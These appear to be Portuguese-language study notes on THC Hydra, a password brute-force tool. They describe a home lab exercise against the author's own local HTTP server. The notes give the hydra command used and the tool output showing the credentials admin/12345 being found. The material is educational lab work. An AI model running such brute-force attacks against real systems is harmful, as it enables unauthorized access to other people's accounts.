THC Hydra

- Ferramenta de cracking de senhas utilizando da técnica de força bruta
- Protocolos de suporte FTP, HTTP, SSH, entre outros
- Código aberto no github, construido na linguagem C
- Pode receber como parâmetro uma lista de senhas a testar para automatizar o processo

Normalmente utilizado em ambientes Unix, mas é cross-platform

Pode ser instalado, mas no Kali Linux vem instalado por padrão

Prática realizada: 

Subir um servidor http com sauth no Windows (biblioteca python que levanta um server http e autentica a rota raiz):

- sauth admin 12345

Rodar o hydra com os parâmetros a seguir:

- sudo hydra -v -L arq.txt -P arq2.txt 192.168.1.11 -s 8333 http-get

Saída recebida:

<h4>
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-16 22:43:49

[WARNING] You must supply the web page as an additional option or via -m, default path set to /

[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task

[DATA] attacking http-get://192.168.1.11:8333/

[VERBOSE] Resolving addresses ... [VERBOSE] resolving done

<font color="green">
[8333][http-get] host: 192.168.1.11   login: admin   password: 12345
</font>

[STATUS] attack finished for 192.168.1.11 (waiting for children to complete tests)

1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-16 22:43:50

Ou seja ele, encontrou o login com admin e senha 12345

</h4>

Link com artigo:

- https://medium.com/liveonnetwork/hydra-tryhackme-f3efb6658ac0